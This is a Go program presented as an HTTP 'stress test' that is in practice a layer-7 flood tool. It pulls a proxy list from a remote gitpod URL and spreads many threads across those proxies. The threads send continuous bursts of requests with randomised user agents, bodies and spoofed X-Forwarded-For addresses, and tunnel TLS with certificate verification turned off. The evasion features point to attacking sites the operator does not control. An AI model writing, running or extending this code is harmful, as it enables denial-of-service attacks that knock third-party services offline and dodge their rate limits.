package main

import (
    "bufio"
    "bytes"
    "context"
    "crypto/tls"
    "fmt"
    "log"
    "math/rand"
    "net"
    "net/http"
    "net/url"
    "os"
    "strconv"
    "strings"
    "sync"
    "time"
)

// ProxyPool provides simple round-robin access to proxies
// Workers will pick a single proxy at startup and stick with it
// to ensure per-thread consistency
 type ProxyPool struct {
    proxies []string
}

func NewProxyPool(list []string) *ProxyPool {
    return &ProxyPool{proxies: list}
}

// StressConfig holds test parameters
type StressConfig struct {
    Target     *url.URL
    Threads    int
    Duration   time.Duration
    CustomHost string
    Port       int
    Path       string
    Pool       *ProxyPool
}

var (
    httpMethods  = []string{"GET", "POST", "HEAD"}
    languages    = []string{"en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9"}
    contentTypes = []string{"application/x-www-form-urlencoded", "application/json", "text/plain"}
)

func main() {
    rand.Seed(time.Now().UnixNano())
    if len(os.Args) < 4 {
        fmt.Println("Usage: <URL> <THREADS> <DURATION_SEC> [CUSTOM_HOST]")
        os.Exit(1)
    }

    rawURL := os.Args[1]
    threads, _ := strconv.Atoi(os.Args[2])
    durSec, _ := strconv.Atoi(os.Args[3])
    custom := ""
    if len(os.Args) > 4 {
        custom = os.Args[4]
    }

    targetURL, err := url.Parse(rawURL)
    if err != nil {
        log.Fatalf("Invalid URL: %v", err)
    }
    port := determinePort(targetURL)
    path := targetURL.RequestURI()

    proxyList, err := loadProxies("https://8080-jdpst224-projectdown-4rfkvo3lqbs.ws-us120.gitpod.io/proxies")
    if err != nil || len(proxyList) == 0 {
        log.Fatalf("Failed to load proxies: %v", err)
    }
    pool := NewProxyPool(proxyList)

    cfg := &StressConfig{
        Target:     targetURL,
        Threads:    threads,
        Duration:   time.Duration(durSec) * time.Second,
        CustomHost: custom,
        Port:       port,
        Path:       path,
        Pool:       pool,
    }

    fmt.Printf("Starting stress test: %s | threads=%d | duration=%v | proxies=%d\n",
        rawURL, threads, cfg.Duration, len(proxyList))
    ctx, cancel := context.WithTimeout(context.Background(), cfg.Duration)
    defer cancel()

    runWorkers(ctx, cfg)
    fmt.Println("Stress test completed.")
}

func runWorkers(ctx context.Context, cfg *StressConfig) {
    var wg sync.WaitGroup
    for i := 0; i < cfg.Threads; i++ {
        wg.Add(1)
        // assign each worker a single proxy based on its index
        proxy := cfg.Pool.proxies[i%len(cfg.Pool.proxies)]
        go func(id int, proxyAddr string) {
            defer wg.Done()
            ticker := time.NewTicker(50 * time.Millisecond)
            defer ticker.Stop()
            for {
                select {
                case <-ctx.Done():
                    return
                case <-ticker.C:
                    // jitter ±10ms
                    time.Sleep(time.Duration(rand.Intn(20)-10) * time.Millisecond)
                    addr := fmt.Sprintf("%s:%d", cfg.Target.Hostname(), cfg.Port)
                    conn, isTLS, err := connect(proxyAddr, addr)
                    if err != nil {
                        // retry on next tick
                        continue
                    }
                    sendBurst(conn, cfg, isTLS, 60)
                    conn.Close()
                }
            }
        }(i, proxy)
    }
    wg.Wait()
}

func connect(proxyAddr, target string) (net.Conn, bool, error) {
    proxyURL, err := url.Parse("http://" + proxyAddr)
    if err != nil {
        return nil, false, err
    }
    dialCtx := (&net.Dialer{Timeout: 5 * time.Second}).DialContext
    conn, err := dialCtx(context.Background(), "tcp", proxyURL.Host)
    if err != nil {
        return nil, false, err
    }
    isTLS := strings.HasSuffix(target, ":443")
    if isTLS {
        // issue CONNECT for HTTPS
        req := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", target, target)
        if _, err := conn.Write([]byte(req)); err != nil {
            conn.Close()
            return nil, false, err
        }
        br := bufio.NewReader(conn)
        status, _ := br.ReadString('\n')
        if !strings.Contains(status, "200") {
            conn.Close()
            return nil, false, fmt.Errorf("CONNECT failed: %s", status)
        }
        // drain headers
        for {
            line, _ := br.ReadString('\n')
            if line == "\r\n" || line == "\n" {
                break
            }
        }
        tlsConn := tls.Client(conn, &tls.Config{InsecureSkipVerify: true, ServerName: strings.Split(target, ":")[0]})
        if err := tlsConn.Handshake(); err != nil {
            tlsConn.Close()
            return nil, false, err
        }
        return tlsConn, true, nil
    }
    return conn, false, nil
}

func sendBurst(conn net.Conn, cfg *StressConfig, isTLS bool, count int) {
    for i := 0; i < count; i++ {
        method := httpMethods[rand.Intn(len(httpMethods))]
        header, body := buildRequest(cfg, method, isTLS)
        bufs := net.Buffers{[]byte(header)}
        if len(body) > 0 {
            bufs = append(bufs, body)
        }
        bufs.WriteTo(conn)
    }
}

func loadProxies(urlStr string) ([]string, error) {
    resp, err := http.Get(urlStr)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()
    var list []string
    scanner := bufio.NewScanner(resp.Body)
    for scanner.Scan() {
        line := strings.TrimSpace(scanner.Text())
        if line != "" {
            list = append(list, line)
        }
    }
    return list, scanner.Err()
}

func buildRequest(cfg *StressConfig, method string, viaTLS bool) (string, []byte) {
    path := cfg.Path
    if !viaTLS {
        path = cfg.Target.String()
    }
    buf := &bytes.Buffer{}
    hostHdr := cfg.Target.Hostname()
    if cfg.CustomHost != "" {
        hostHdr = cfg.CustomHost
    }
    buf.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\nHost: %s:%d\r\n", method, path, hostHdr, cfg.Port))
    buf.WriteString("User-Agent: " + randomUserAgent() + "\r\n")
    buf.WriteString("Accept-Language: " + languages[rand.Intn(len(languages))] + "\r\n")
    buf.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n")
    buf.WriteString("Accept-Encoding: gzip, deflate, br, zstd\r\n")
    buf.WriteString("Connection: keep-alive\r\n")
    buf.WriteString(fmt.Sprintf("X-Forwarded-For: %d.%d.%d.%d\r\n", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256)))

    var body []byte
    if method == "POST" {
        ct := contentTypes[rand.Intn(len(contentTypes))]
        body = createBody(ct)
        buf.WriteString(fmt.Sprintf("Content-Type: %s\r\nContent-Length: %d\r\n", ct, len(body)))
    }
    buf.WriteString(fmt.Sprintf("Referer: https://%s/\r\n\r\n", hostHdr))
    return buf.String(), body
}

func determinePort(u *url.URL) int {
    if p := u.Port(); p != "" {
        if pi, err := strconv.Atoi(p); err == nil {
            return pi
        }
    }
    if u.Scheme == "https" {
        return 443
    }
    return 80
}

func randomString(n int) string {
    const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    b := make([]byte, n)
    for i := range b {
        b[i] = letters[rand.Intn(len(letters))]
    }
    return string(b)
}

func randomUserAgent() string {
    oses := []string{"Windows NT 10.0; Win64; x64", "Macintosh; Intel Mac OS X 10_15_7", "X11; Linux x86_64"}
    os := oses[rand.Intn(len(oses))]
    switch rand.Intn(3) {
    case 0:
        v := fmt.Sprintf("%d.0.%d.0", rand.Intn(40)+80, rand.Intn(4000))
        return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/%s", os, v, v)
    case 1:
        v := fmt.Sprintf("%d.0", rand.Intn(40)+70)
        return fmt.Sprintf("Mozilla/5.0 (%s; rv:%s) Gecko/20100101 Firefox/%s", os, v, v)
    default:
        v := fmt.Sprintf("%d.0.%d", rand.Intn(16)+600, rand.Intn(100))
        return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/%s (KHTML, like Gecko) Version=13.1 Safari/%s", os, v, v)
    }
}

func createBody(contentType string) []byte {
    var b bytes.Buffer
    switch contentType {
    case "application/x-www-form-urlencoded":
        vals := url.Values{}
        for i := 0; i < 3; i++ {
            vals.Set(randomString(5), randomString(8))
        }
        b.WriteString(vals.Encode())
    case "application/json":
        b.WriteByte('{')
        for i := 0; i < 3; i++ {
            if i > 0 {
                b.WriteByte(',')
            }
            fmt.Fprintf(&b, `"%s":"%s"`, randomString(5), randomString(8))
        }
        b.WriteByte('}')
    case "text/plain":
        b.WriteString("text_" + randomString(12))
    }
    return b.Bytes()
}
